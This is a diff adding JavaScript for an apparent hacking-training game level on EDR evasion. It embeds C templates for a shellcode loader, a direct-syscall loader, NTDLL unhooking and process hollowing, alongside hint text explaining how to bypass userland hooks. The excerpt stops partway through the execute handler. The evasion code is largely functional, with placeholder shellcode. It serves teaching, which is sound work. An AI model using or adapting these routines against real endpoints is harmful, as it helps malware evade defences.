@@ -1,0 +1,882 @@
+<script>
+// ============================================
+// LEVEL 4: EDR EVASION - Ghost Protocol
+// Technical EDR bypass with code modification
+// ============================================
+
+const LEVEL4_EDR = {
+  name: 'CrowdDefender',
+  version: '6.42.15909',
+  hooks: {
+    'NtAllocateVirtualMemory': { hooked: true, detected: true },
+    'NtWriteVirtualMemory': { hooked: true, detected: true },
+    'NtCreateThreadEx': { hooked: true, detected: true },
+    'NtProtectVirtualMemory': { hooked: true, detected: true },
+    'NtMapViewOfSection': { hooked: true, detected: true },
+    'NtQueueApcThread': { hooked: true, detected: false }
+  },
+  signatures: ['msfvenom', 'cobalt', 'shellcode', 'mimikatz'],
+  alertCount: 0,
+  bypassMethods: []
+};
+
+const EDR_CODE_TEMPLATES = {
+  basic_loader: `// basic_loader.c - DETECTED by EDR
+#include <windows.h>
+
+unsigned char shellcode[] = "\\x90\\x90\\x90...";
+
+int main() {
+    // EDR HOOKS THESE CALLS!
+    void* exec = VirtualAlloc(0, sizeof(shellcode),
+                              MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, sizeof(shellcode));
+    ((void(*)())exec)();
+    return 0;
+}`,
+
+  syscall_loader: `// syscall_loader.c - Direct syscalls bypass hooks
+#include <windows.h>
+
+// Syscall stubs - bypass userland hooks
+extern NTSTATUS NtAllocateVirtualMemory_Syscall(
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+);
+
+// SSN (System Service Number) for Windows 10 21H2
+#define SYSCALL_NTALLOCATEVIRTUALMEMORY 0x18
+
+unsigned char shellcode[] = "\\xfc\\x48\\x83...";
+
+int main() {
+    PVOID baseAddr = NULL;
+    SIZE_T regionSize = sizeof(shellcode);
+
+    // Direct syscall - EDR can't hook this!
+    NtAllocateVirtualMemory_Syscall(
+        GetCurrentProcess(),
+        &baseAddr,
+        0,
+        &regionSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    // Copy and execute...
+    return 0;
+}`,
+
+  unhook_ntdll: `// unhook_ntdll.c - Restore clean NTDLL
+#include <windows.h>
+
+BOOL UnhookNtdll() {
+    // Get handle to ntdll.dll
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    // Map fresh copy from disk (not hooked!)
+    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
+                               GENERIC_READ, FILE_SHARE_READ,
+                               NULL, OPEN_EXISTING, 0, NULL);
+
+    HANDLE hMapping = CreateFileMapping(hFile, NULL,
+                                        PAGE_READONLY, 0, 0, NULL);
+
+    LPVOID pCleanNtdll = MapViewOfFile(hMapping,
+                                        FILE_MAP_READ, 0, 0, 0);
+
+    // Find .text section and overwrite hooked copy
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)
+        ((BYTE*)hNtdll + pDosHeader->e_lfanew);
+
+    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER pSection =
+            IMAGE_FIRST_SECTION(pNtHeaders) + i;
+
+        if (!strcmp((char*)pSection->Name, ".text")) {
+            DWORD oldProtect;
+            VirtualProtect(
+                (LPVOID)((BYTE*)hNtdll + pSection->VirtualAddress),
+                pSection->Misc.VirtualSize,
+                PAGE_EXECUTE_READWRITE,
+                &oldProtect
+            );
+
+            // Copy clean .text over hooked one
+            memcpy(
+                (LPVOID)((BYTE*)hNtdll + pSection->VirtualAddress),
+                (LPVOID)((BYTE*)pCleanNtdll + pSection->VirtualAddress),
+                pSection->Misc.VirtualSize
+            );
+
+            VirtualProtect(
+                (LPVOID)((BYTE*)hNtdll + pSection->VirtualAddress),
+                pSection->Misc.VirtualSize,
+                oldProtect,
+                &oldProtect
+            );
+        }
+    }
+
+    CloseHandle(hMapping);
+    CloseHandle(hFile);
+    return TRUE;
+}`,
+
+  process_hollow: `// process_hollow.c - Process Hollowing
+#include <windows.h>
+
+BOOL ProcessHollow(char* targetPath, unsigned char* shellcode, size_t scSize) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+
+    // Create suspended process
+    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        return FALSE;
+    }
+
+    // Get thread context to find entry point
+    GetThreadContext(pi.hThread, &ctx);
+
+    // Read PEB to get image base
+    PVOID pImageBase;
+    ReadProcessMemory(pi.hProcess,
+                      (PVOID)(ctx.Rdx + 0x10), // PEB->ImageBaseAddress
+                      &pImageBase,
+                      sizeof(PVOID), NULL);
+
+    // Unmap original executable
+    NtUnmapViewOfSection(pi.hProcess, pImageBase);
+
+    // Allocate memory at same location
+    PVOID pNewBase = VirtualAllocEx(pi.hProcess, pImageBase, scSize,
+                                     MEM_COMMIT | MEM_RESERVE,
+                                     PAGE_EXECUTE_READWRITE);
+
+    // Write shellcode
+    WriteProcessMemory(pi.hProcess, pNewBase, shellcode, scSize, NULL);
+
+    // Update entry point in context
+    ctx.Rcx = (DWORD64)pNewBase;
+    SetThreadContext(pi.hThread, &ctx);
+
+    // Resume thread - shellcode executes!
+    ResumeThread(pi.hThread);
+
+    return TRUE;
+}`
+};
+
+async function initLevel4() {
+  gameState.levelState = {
+    // Analysis Phase
+    analyzedEDR: false,
+    foundHooks: false,
+    identifiedBypass: false,
+
+    // Code Modification Phase
+    openedEditor: false,
+    selectedTechnique: null,
+    modifiedCode: false,
+    compiledPayload: false,
+
+    // Evasion Techniques
+    unhookedNtdll: false,
+    usedSyscalls: false,
+    usedHollowing: false,
+
+    // Execution Phase
+    payloadLoaded: false,
+    edrBypassed: false,
+    shellObtained: false,
+
+    // Current state
+    currentFile: null,
+    compiledFiles: [],
+    alerts: 0,
+    detected: false
+  };
+
+  clear();
+  print('');
+  print('╔═══════════════════════════════════════════════════════════════════════════════════╗', 'warning');
+  print('║                       LEVEL 4: EDR EVASION                                        ║', 'warning');
+  print('║                      "Ghost in the Machine"                                       ║', 'error');
+  print('╠═══════════════════════════════════════════════════════════════════════════════════╣', 'warning');
+  print('║                                                                                   ║', 'info');
+  print('║        ╔══════════════════════════════════════════════════════════╗               ║', 'error');
+  print('║        ║  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ║               ║', 'error');
+  print('║        ║  ▓  CROWDDEFENDER EDR v6.42.15909                     ▓  ║               ║', 'error');
+  print('║        ║  ▓  Status: ACTIVE | Monitoring: ENABLED              ▓  ║               ║', 'error');
+  print('║        ║  ▓  Hooks: 47 API calls | Alerts: 0                   ▓  ║               ║', 'error');
+  print('║        ║  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ║               ║', 'error');
+  print('║        ╚══════════════════════════════════════════════════════════╝               ║', 'error');
+  print('║                                                                                   ║', 'info');
+  print('║   TARGET: SECURE-WKS01.MEGACORP.LOCAL                                            ║', 'system');
+  print('║   CHALLENGE: Execute shellcode without triggering EDR alerts                     ║', 'warning');
+  print('║   RESTRICTION: Standard payloads are detected immediately                        ║', 'error');
+  print('║                                                                                   ║', 'info');
+  print('║   AVAILABLE TECHNIQUES:                                                           ║', 'info');
+  print('║     [1] NTDLL Unhooking - Restore clean NTDLL from disk                          ║', 'success');
+  print('║     [2] Direct Syscalls - Bypass userland hooks entirely                         ║', 'success');
+  print('║     [3] Process Hollowing - Hide in legitimate process                           ║', 'success');
+  print('║     [4] Module Stomping - Overwrite loaded DLL                                   ║', 'warning');
+  print('║                                                                                   ║', 'info');
+  print('╚═══════════════════════════════════════════════════════════════════════════════════╝', 'warning');
+  print('');
+
+  await typeText('[BRIEFING] Target has CrowdDefender EDR deployed', 30, 'system');
+  await typeText('[BRIEFING] All standard shellcode loaders are detected', 30, 'error');
+  await typeText('[BRIEFING] You must modify code to evade detection', 30, 'warning');
+  await typeText('[BRIEFING] Use the code editor (vim) to modify payloads', 30, 'info');
+  print('');
+  print('[*] Available tools: analyze, hooks, edit <file>, compile, execute', 'info');
+  print('[*] Use "help" for full command list', 'system');
+  print('');
+
+  updateHUD('4 - EDR Evasion', 'SECURE-WKS01', 'Execute payload undetected', 0);
+  setPrompt('operator', 'C2-SERVER', '~/payloads');
+}
+
+async function handleLevel4Command(cmd, args) {
+  const state = gameState.levelState;
+  const fullCmd = args.length > 0 ? `${cmd} ${args.join(' ')}` : cmd;
+
+  // ═══════════════════════════════════════════════════════════════
+  // HELP COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'help') {
+    print('');
+    print('╔════════════════════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                            LEVEL 4 COMMANDS                                    ║', 'info');
+    print('╠════════════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                                               ║', 'info');
+    print('║    analyze               Analyze target EDR configuration                     ║', 'system');
+    print('║    hooks                 List hooked API calls in ntdll.dll                   ║', 'system');
+    print('║    signatures            View known malware signatures                         ║', 'system');
+    print('║                                                                                ║', 'info');
+    print('║  CODE DEVELOPMENT:                                                             ║', 'warning');
+    print('║    ls                    List available payload templates                      ║', 'system');
+    print('║    cat <file>            View file contents                                    ║', 'system');
+    print('║    edit <file>           Open file in vim-like editor                         ║', 'success');
+    print('║    compile <file>        Compile C code to executable                         ║', 'success');
+    print('║                                                                                ║', 'info');
+    print('║  EVASION TECHNIQUES:                                                           ║', 'error');
+    print('║    unhook                Execute NTDLL unhooking routine                      ║', 'warning');
+    print('║    syscall               Switch to direct syscall implementation              ║', 'warning');
+    print('║    hollow <process>      Use process hollowing technique                       ║', 'warning');
+    print('║                                                                                ║', 'info');
+    print('║  EXECUTION:                                                                    ║', 'info');
+    print('║    execute <file>        Execute compiled payload on target                   ║', 'error');
+    print('║    beacon                Check if beacon is active                            ║', 'system');
+    print('║                                                                                ║', 'info');
+    print('║  UTILITY:                                                                      ║', 'info');
+    print('║    status                Show progress                                        ║', 'success');
+    print('║    hint                  Get contextual hint                                  ║', 'warning');
+    print('║    alerts                Show EDR alert count                                 ║', 'error');
+    print('║    exit                  Return to main menu                                  ║', 'system');
+    print('╚════════════════════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // STATUS COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'status') {
+    const progress = calculateLevel4Progress(state);
+    print('');
+    print('╔══════════════════════════════════════════════════════════════════╗', 'info');
+    print('║               LEVEL 4 PROGRESS - EDR EVASION                     ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                                 ║', 'info');
+    print(`║    [${state.analyzedEDR ? '✓' : ' '}] EDR analyzed                                      ║`, state.analyzedEDR ? 'success' : 'system');
+    print(`║    [${state.foundHooks ? '✓' : ' '}] API hooks identified                               ║`, state.foundHooks ? 'success' : 'system');
+    print(`║    [${state.identifiedBypass ? '✓' : ' '}] Bypass technique identified                      ║`, state.identifiedBypass ? 'success' : 'system');
+    print('║                                                                  ║', 'info');
+    print('║  CODE MODIFICATION:                                              ║', 'info');
+    print(`║    [${state.openedEditor ? '✓' : ' '}] Payload editor opened                             ║`, state.openedEditor ? 'success' : 'system');
+    print(`║    [${state.modifiedCode ? '✓' : ' '}] Code modified for evasion                         ║`, state.modifiedCode ? 'success' : 'system');
+    print(`║    [${state.compiledPayload ? '✓' : ' '}] Payload compiled                                  ║`, state.compiledPayload ? 'success' : 'system');
+    print('║                                                                  ║', 'info');
+    print('║  EVASION TECHNIQUES USED:                                        ║', 'info');
+    print(`║    [${state.unhookedNtdll ? '✓' : ' '}] NTDLL Unhooking                                   ║`, state.unhookedNtdll ? 'success' : 'system');
+    print(`║    [${state.usedSyscalls ? '✓' : ' '}] Direct Syscalls                                   ║`, state.usedSyscalls ? 'success' : 'system');
+    print(`║    [${state.usedHollowing ? '✓' : ' '}] Process Hollowing                                 ║`, state.usedHollowing ? 'success' : 'system');
+    print('║                                                                  ║', 'info');
+    print('║  EXECUTION:                                                      ║', 'info');
+    print(`║    [${state.edrBypassed ? '✓' : ' '}] EDR Bypassed                                       ║`, state.edrBypassed ? 'success' : 'system');
+    print(`║    [${state.shellObtained ? '✓' : ' '}] Shell obtained                                    ║`, state.shellObtained ? 'success' : 'system');
+    print('╠══════════════════════════════════════════════════════════════════╣', 'info');
+    print(`║  Progress: ${String(progress).padStart(3)}%          EDR Alerts: ${state.alerts}                       ║`, state.alerts > 0 ? 'error' : 'success');
+    print('╚══════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    updateHUD('4 - EDR Evasion', 'SECURE-WKS01', 'Execute undetected', progress);
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // HINT COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'hint') {
+    print('');
+    print('💡 HINT:', 'warning');
+
+    if (!state.analyzedEDR) {
+      print('Start by analyzing the EDR to understand what it monitors.', 'info');
+      print('Try: analyze', 'success');
+    } else if (!state.foundHooks) {
+      print('Identify which API calls are hooked by the EDR.', 'info');
+      print('Try: hooks', 'success');
+    } else if (!state.identifiedBypass) {
+      print('Look at available evasion techniques based on the hooks.', 'info');
+      print('NTDLL unhooking restores clean API functions.', 'info');
+      print('Direct syscalls bypass userland hooks entirely.', 'warning');
+      print('Try: ls (to see payload templates)', 'success');
+    } else if (!state.openedEditor) {
+      print('Open a payload template in the code editor to modify it.', 'info');
+      print('Try: edit syscall_loader.c', 'success');
+    } else if (!state.modifiedCode) {
+      print('In the editor, the code needs to compile. Just save it (:w) to mark as modified.', 'info');
+      print('Standard vim commands: i (insert), Esc (normal), :wq (save and quit)', 'info');
+    } else if (!state.compiledPayload) {
+      print('Compile your modified payload.', 'info');
+      print('Try: compile syscall_loader.c', 'success');
+    } else if (!state.edrBypassed) {
+      print('Execute your payload on the target. Use evasion if needed.', 'info');
+      print('Try: unhook (to restore clean NTDLL first)', 'info');
+      print('Then: execute syscall_loader.exe', 'success');
+    } else {
+      print('Check if your beacon is active with: beacon', 'success');
+    }
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // ANALYZE EDR
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'analyze') {
+    await simulateLoading('Analyzing target EDR', 3000);
+    print('');
+    print('╔════════════════════════════════════════════════════════════════════════════╗', 'error');
+    print('║                      EDR ANALYSIS REPORT                                   ║', 'error');
+    print('╠════════════════════════════════════════════════════════════════════════════╣', 'error');
+    print('║  Product:      CrowdDefender Endpoint Protection                           ║', 'system');
+    print('║  Version:      6.42.15909                                                  ║', 'system');
+    print('║  Sensor ID:    a3f9c2e1-8b7d-4c6a-9e5f-1d2c3b4a5e6f                        ║', 'system');
+    print('╠════════════════════════════════════════════════════════════════════════════╣', 'error');
+    print('║  DETECTION CAPABILITIES:                                                   ║', 'warning');
+    print('║    [■] Userland API Hooking (ntdll.dll, kernel32.dll)                     ║', 'error');
+    print('║    [■] Behavioral Analysis (suspicious API sequences)                      ║', 'error');
+    print('║    [■] Memory Scanning (shellcode signatures)                              ║', 'error');
+    print('║    [■] ETW Telemetry (kernel callbacks)                                   ║', 'warning');
+    print('║    [□] Kernel-level Monitoring (driver not loaded)                         ║', 'success');
+    print('║                                                                            ║', 'info');
+    print('║  BYPASS POTENTIAL:                                                         ║', 'success');
+    print('║    - Userland hooks can be bypassed via NTDLL unhooking                   ║', 'success');
+    print('║    - Direct syscalls bypass all userland hooks                            ║', 'success');
+    print('║    - Process hollowing can evade behavioral analysis                       ║', 'success');
+    print('║    - No kernel driver = no ETW patching needed                            ║', 'success');
+    print('╚════════════════════════════════════════════════════════════════════════════╝', 'error');
+    print('');
+
+    state.analyzedEDR = true;
+    state.identifiedBypass = true;
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // HOOKS - List hooked functions
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'hooks') {
+    if (!state.analyzedEDR) {
+      print('[!] Analyze the EDR first', 'warning');
+      return;
+    }
+
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                    NTDLL.DLL HOOK ANALYSIS                            ║', 'info');
+    print('╠═══════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  Scanning ntdll.dll for inline hooks...                               ║', 'system');
+    print('╠═══════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  FUNCTION                      HOOKED    FIRST BYTES                  ║', 'info');
+    print('║  ─────────────────────────────────────────────────────────────────── ║', 'info');
+    print('║  NtAllocateVirtualMemory       [YES]     E9 xx xx xx xx (JMP)        ║', 'error');
+    print('║  NtWriteVirtualMemory          [YES]     E9 xx xx xx xx (JMP)        ║', 'error');
+    print('║  NtCreateThreadEx              [YES]     E9 xx xx xx xx (JMP)        ║', 'error');
+    print('║  NtProtectVirtualMemory        [YES]     E9 xx xx xx xx (JMP)        ║', 'error');
+    print('║  NtMapViewOfSection            [YES]     E9 xx xx xx xx (JMP)        ║', 'error');
+    print('║  NtQueueApcThread              [YES]     E9 xx xx xx xx (JMP)        ║', 'error');
+    print('║  NtOpenProcess                 [YES]     E9 xx xx xx xx (JMP)        ║', 'error');
+    print('║  NtReadVirtualMemory           [NO]      4C 8B D1 B8 3F (clean)      ║', 'success');
+    print('║  NtClose                       [NO]      4C 8B D1 B8 0F (clean)      ║', 'success');
+    print('╠═══════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  HOOK TYPE: Inline JMP (5-byte hook redirecting to EDR DLL)          ║', 'warning');
+    print('║  EDR DLL:   CrowdDefender.dll (loaded at 0x00007FF8A1B20000)         ║', 'system');
+    print('╠═══════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  BYPASS OPTIONS:                                                      ║', 'success');
+    print('║    1. Map fresh ntdll.dll from disk and overwrite .text section      ║', 'success');
+    print('║    2. Use direct syscalls (manual syscall instruction)                ║', 'success');
+    print('║    3. Use unhooked APIs (NtQueueApcThread for APC injection)         ║', 'success');
+    print('╚═══════════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+
+    state.foundHooks = true;
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SIGNATURES - View known malware signatures
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'signatures') {
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                    KNOWN MALWARE SIGNATURES                           ║', 'info');
+    print('╠═══════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  SIGNATURE                   TYPE           DETECTED                  ║', 'info');
+    print('║  ─────────────────────────────────────────────────────────────────── ║', 'info');
+    print('║  msfvenom/shikata_ga_nai     Encoder        YES                       ║', 'error');
+    print('║  cobalt_strike_beacon        C2             YES                       ║', 'error');
+    print('║  mimikatz_strings            Credential     YES                       ║', 'error');
+    print('║  metasploit_shellcode        Shellcode      YES                       ║', 'error');
+    print('║  rawshellcode_exec_rwx       Behavior       YES                       ║', 'error');
+    print('║  custom_xor_stub             Encoder        NO (custom key)           ║', 'success');
+    print('║  direct_syscall_stub         Syscall        NO (no signatures)        ║', 'success');
+    print('╚═══════════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    print('[*] TIP: Use custom encoding or direct syscalls to avoid signatures', 'info');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // LS - List payload templates
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'ls') {
+    print('');
+    print('drwxr-xr-x  2 operator operator 4096 Jan 15 10:00 .', 'system');
+    print('drwxr-xr-x  5 operator operator 4096 Jan 15 09:00 ..', 'system');
+    print('-rw-r--r--  1 operator operator  512 Jan 15 10:00 basic_loader.c', 'error');
+    print('-rw-r--r--  1 operator operator 1024 Jan 15 10:00 syscall_loader.c', 'success');
+    print('-rw-r--r--  1 operator operator 2048 Jan 15 10:00 unhook_ntdll.c', 'success');
+    print('-rw-r--r--  1 operator operator 1536 Jan 15 10:00 process_hollow.c', 'success');
+    print('-rw-r--r--  1 operator operator  256 Jan 15 10:00 shellcode.bin', 'system');
+    state.compiledFiles.forEach(f => {
+      print(`-rwxr-xr-x  1 operator operator 8192 Jan 15 12:00 ${f}`, 'warning');
+    });
+    print('');
+    print('[*] .c files are templates, use "edit <file>" to modify', 'info');
+    print('[*] basic_loader.c will be DETECTED - use advanced techniques!', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // CAT - View file contents
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'cat') {
+    const file = args[0];
+
+    if (file === 'basic_loader.c') {
+      print('', 'system');
+      print(EDR_CODE_TEMPLATES.basic_loader, 'system');
+      print('', 'system');
+      print('[!] WARNING: This loader uses hooked APIs - WILL BE DETECTED!', 'error');
+      return;
+    }
+
+    if (file === 'syscall_loader.c') {
+      print('', 'system');
+      print(EDR_CODE_TEMPLATES.syscall_loader, 'system');
+      print('', 'system');
+      print('[*] This loader uses direct syscalls - bypasses userland hooks', 'success');
+      return;
+    }
+
+    if (file === 'unhook_ntdll.c') {
+      print('', 'system');
+      print(EDR_CODE_TEMPLATES.unhook_ntdll, 'system');
+      print('', 'system');
+      print('[*] This restores clean NTDLL by mapping from disk', 'success');
+      return;
+    }
+
+    if (file === 'process_hollow.c') {
+      print('', 'system');
+      print(EDR_CODE_TEMPLATES.process_hollow, 'system');
+      print('', 'system');
+      print('[*] This hides shellcode in a legitimate process', 'success');
+      return;
+    }
+
+    print(`cat: ${file}: No such file or directory`, 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // EDIT - Open code editor
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'edit' || cmd === 'vim' || cmd === 'vi') {
+    const file = args[0];
+
+    if (!file) {
+      print('Usage: edit <filename.c>', 'error');
+      return;
+    }
+
+    const templates = {
+      'basic_loader.c': EDR_CODE_TEMPLATES.basic_loader,
+      'syscall_loader.c': EDR_CODE_TEMPLATES.syscall_loader,
+      'unhook_ntdll.c': EDR_CODE_TEMPLATES.unhook_ntdll,
+      'process_hollow.c': EDR_CODE_TEMPLATES.process_hollow
+    };
+
+    if (templates[file]) {
+      state.currentFile = file;
+      state.openedEditor = true;
+
+      // Open the code editor with the template
+      openCodeEditor(file, templates[file], (newContent) => {
+        // Called when user saves
+        state.modifiedCode = true;
+        print(`[+] ${file} modified and saved`, 'success');
+        autosave();
+      });
+
+      setActiveWorkspace(3); // Switch to code workspace
+      return;
+    }
+
+    print(`[!] File not found: ${file}`, 'error');
+    print('[*] Available files: basic_loader.c, syscall_loader.c, unhook_ntdll.c, process_hollow.c', 'info');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // COMPILE - Compile payload
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'compile') {
+    const file = args[0];
+
+    if (!file) {
+      print('Usage: compile <filename.c>', 'error');
+      return;
+    }
+
+    if (!file.endsWith('.c')) {
+      print('[!] Can only compile .c files', 'error');
+      return;
+    }
+
+    const validFiles = ['basic_loader.c', 'syscall_loader.c', 'unhook_ntdll.c', 'process_hollow.c'];
+    if (!validFiles.includes(file)) {
+      print(`[!] Unknown file: ${file}`, 'error');
+      return;
+    }
+
+    await simulateLoading(`Compiling ${file}`, 2000);
+
+    const exeName = file.replace('.c', '.exe');
+    print('');
+    print('[*] x86_64-w64-mingw32-gcc -o ' + exeName + ' ' + file + ' -lntdll', 'system');
+    print('[*] Linking against ntdll.lib...', 'system');
+    print('[+] Compilation successful!', 'success');
+    print(`[+] Output: ${exeName}`, 'success');
+
+    if (!state.compiledFiles.includes(exeName)) {
+      state.compiledFiles.push(exeName);
+    }
+    state.compiledPayload = true;
+
+    if (file === 'basic_loader.c') {
+      print('', 'system');
+      print('[!] WARNING: basic_loader.exe uses standard APIs', 'error');
+      print('[!] It WILL be detected when executed!', 'error');
+    } else {
+      print('', 'system');
+      print('[*] This payload uses evasion techniques', 'success');
+    }
+
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // UNHOOK - NTDLL unhooking
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'unhook') {
+    if (!state.foundHooks) {
+      print('[!] Analyze hooks first with the "hooks" command', 'warning');
+      return;
+    }
+
+    await simulateLoading('Mapping clean ntdll.dll from disk', 2000);
+    print('');
+    print('[*] Reading C:\\Windows\\System32\\ntdll.dll...', 'system');
+    print('[*] Creating file mapping...', 'system');
+    print('[*] Locating .text section...', 'system');
+    print('[*] Changing memory protection to RWX...', 'system');
+    print('[*] Overwriting hooked .text section...', 'system');
+    print('[*] Restoring memory protection...', 'system');
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════════╗', 'success');
+    print('║                  NTDLL UNHOOKING COMPLETE                         ║', 'success');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'success');
+    print('║  [✓] NtAllocateVirtualMemory   - RESTORED                        ║', 'success');
+    print('║  [✓] NtWriteVirtualMemory      - RESTORED                        ║', 'success');
+    print('║  [✓] NtCreateThreadEx          - RESTORED                        ║', 'success');
+    print('║  [✓] NtProtectVirtualMemory    - RESTORED                        ║', 'success');
+    print('║  [✓] NtMapViewOfSection        - RESTORED                        ║', 'success');
+    print('║  [✓] NtQueueApcThread          - RESTORED                        ║', 'success');
+    print('╚═══════════════════════════════════════════════════════════════════╝', 'success');
+    print('');
+    print('[!] EDR userland hooks bypassed!', 'success');
+    print('[*] Standard API calls will now execute without interception', 'info');
+
+    state.unhookedNtdll = true;
+    LEVEL4_EDR.bypassMethods.push('unhook');
+    playSuccess();
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SYSCALL - Switch to direct syscalls
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'syscall') {
+    print('');
+    print('[*] Direct syscall mode explanation:', 'info');
+    print('', 'system');
+    print('    Normal API Call:                Direct Syscall:', 'system');
+    print('    ─────────────────               ─────────────────', 'system');
+    print('    VirtualAlloc()                  mov r10, rcx', 'system');
+    print('         │                          mov eax, 0x18  ; SSN', 'system');
+    print('         ▼                          syscall', 'system');
+    print('    kernel32.dll                         │', 'system');
+    print('         │                               │', 'system');
+    print('         ▼                               │', 'system');
+    print('    ntdll.dll ◄── EDR HOOKS HERE         │', 'error');
+    print('         │                               │', 'system');
+    print('         ▼                               ▼', 'system');
+    print('    [KERNEL MODE]                  [KERNEL MODE]', 'success');
+    print('', 'system');
+    print('[+] Direct syscalls completely bypass userland hooks', 'success');
+    print('[*] Use syscall_loader.c which implements this technique', 'info');
+
+    state.usedSyscalls = true;
+    LEVEL4_EDR.bypassMethods.push('syscall');
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // HOLLOW - Process hollowing
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'hollow') {
+    const target = args[0] || 'svchost.exe';
+
+    print('');
+    print(`[*] Process Hollowing - Target: ${target}`, 'warning');
+    print('', 'system');
+    print('[*] Technique explanation:', 'info');
+    print('    1. Create legitimate process in SUSPENDED state', 'system');
+    print('    2. Unmap original executable from memory', 'system');
+    print('    3. Allocate new memory at same location', 'system');
+    print('    4. Write shellcode to new memory', 'system');
+    print('    5. Update thread context (entry point)', 'system');
+    print('    6. Resume thread - shellcode executes', 'system');
+    print('', 'system');
+    print('[+] Result: Shellcode runs inside legitimate process', 'success');
+    print('[+] Evades: Process creation monitoring, behavioral analysis', 'success');
+    print('[*] Use process_hollow.c which implements this technique', 'info');
+
+    state.usedHollowing = true;
+    LEVEL4_EDR.bypassMethods.push('hollow');
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // EXECUTE - Execute payload
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'execute') {
+    const file = args[0];
+
+    if (!file) {
+      print('Usage: execute <payload.exe>', 'error');
+      return;
+    }
+
+    if (!state.compiledFiles.includes(file)) {
+      print(`[!] File not found or not compiled: ${file}`, 'error');
+      print('[*] Compile first with: compile <source.c>', 'info');
+      return;
+    }
+
+    // Check if using basic loader without evasion
+    if (file === 'basic_loader.exe' && !state.unhookedNtdll) {
+      await simulateLoading('Deploying payload to target', 2000);
+      print('');
+      print('[*] Uploading basic_loader.exe to target...', 'system');
+      print('[*] Executing payload...', 'system');
+      await sleep(1000);
+      print('');
+      print('╔════════════════════════════════════════════════════════════════════════╗', 'error');
+      print('║  ⚠️  CROWDDEFENDER ALERT  ⚠️                                             ║', 'error');
+      print('╠════════════════════════════════════════════════════════════════════════╣', 'error');
+      print('║  THREAT DETECTED: Malicious Process Execution                          ║', 'error');
+      print('║  Process:    basic_loader.exe                                          ║', 'error');
+      print('║  Signature:  Win.Trojan.ShellcodeLoader                                ║', 'error');
+      print('║  Action:     BLOCKED AND QUARANTINED                                   ║', 'error');
+      print('║                                                                         ║', 'error');
+      print('║  Suspicious behaviors detected:                                         ║', 'warning');
+      print('║    - VirtualAlloc with PAGE_EXECUTE_READWRITE                          ║', 'warning');
+      print('║    - Memory written then executed                                       ║', 'warning');
+      print('║    - Known shellcode patterns in memory                                 ║', 'warning');
